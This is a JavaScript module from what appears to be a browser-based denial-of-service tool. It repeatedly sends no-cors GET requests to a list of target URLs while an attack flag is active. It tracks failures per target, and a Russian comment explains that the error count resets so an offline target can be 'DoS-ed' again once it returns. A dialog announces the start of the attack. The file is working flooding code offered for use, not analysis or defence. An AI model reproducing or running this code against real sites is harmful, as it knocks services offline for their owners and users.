import { confirmDialog } from 'src/modules/dialog'
import { i18n } from 'src/modules/i18n'

const ignoreTargetsList = {}

/**
 *
 * @param {String} target
 */
const confirmReqTarget = target => {
  if (!ignoreTargetsList[target]) {
    ignoreTargetsList[target] = {
      error: 0,
      success: 0,
      unconfirmCount: 0,
    }

    return true
  }

  let confirmResult = !(ignoreTargetsList[target]['success'] === 0 && ignoreTargetsList[target]['error'] > 30)

  // Если количсво отклоненных запросов больше чем resetErrorsCount
  // сбрасываем все ошбки до 0 для конкретной цели
  // нужно для того что бы если цель какое время не активно, а потом появляется в сети - начать ее dos-ить снова

  // Число отклоненных запросов после которого сбрасываем счетчик ошибок
  const resetErrorsCount = 200

  // Если запрос отклонен и unconfirmCount не превышает resetErrorsCount
  if (!confirmResult && ignoreTargetsList[target].unconfirmCount <= resetErrorsCount) {
    ignoreTargetsList[target].unconfirmCount++
  }

  // Если запрос отклонен и unconfirmCount превышает resetErrorsCount
  else if (!confirmResult && ignoreTargetsList[target].unconfirmCount > resetErrorsCount) {
    ignoreTargetsList[target].error = 0
    confirmResult = true
  }

  return confirmResult
}

/**
 * Send requests to targets
 * @param {Array} targetsList
 * @returns {Promise<Array>}
 */
export const initSendReqests = async (targetsList, ctx) => {
  return await new Promise((resolve, reject) => {
    // if user stopped attach
    if (!ctx.getters.getBrowserAttackStatus) {
      resolve({})
      return
    }

    const results = {}

    // List of targets on which requests are heating up
    const targetsListReqs = []

    for (let i = 0; i < targetsList.length; i++) {
      try {
        if (!ctx.getters.getBrowserAttackStatus) {
          resolve({})
          return
        }

        const target = targetsList[i]

        if (!confirmReqTarget(target)) {
          continue
        }
        targetsListReqs.push(target)

        // needed to interrupt the request
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 10000)

        fetch(target, {
          method: 'GET',
          mode: 'no-cors',
          signal: controller.signal,
        })
          .then(() => {
            results[target] = true
            ignoreTargetsList[target].success++
          })
          .catch(() => {
            results[target] = false

            ignoreTargetsList[target].error++
          })
          .finally(() => {
            clearTimeout(timeoutId)

            if (!ctx.getters.getBrowserAttackStatus) {
              resolve(results)
              return
            }

            // if this is not the last request - return
            if (Object.keys(results).length !== targetsListReqs.length) {
              return
            }

            resolve(results)
          })
      } catch (error) {
        console.error(error)
      }
    }
  })
}

/**
 * Dialod window with notification of the start of the attack
 */
export const startAttackNotify = () => {
  confirmDialog({
    title: i18n('attackConfigPage.attackStartedDialog.title'),
    message: i18n('attackConfigPage.attackStartedDialog.description'),
    okLabel: i18n('attackConfigPage.attackStartedDialog.okBtnLabel'),
  })
}
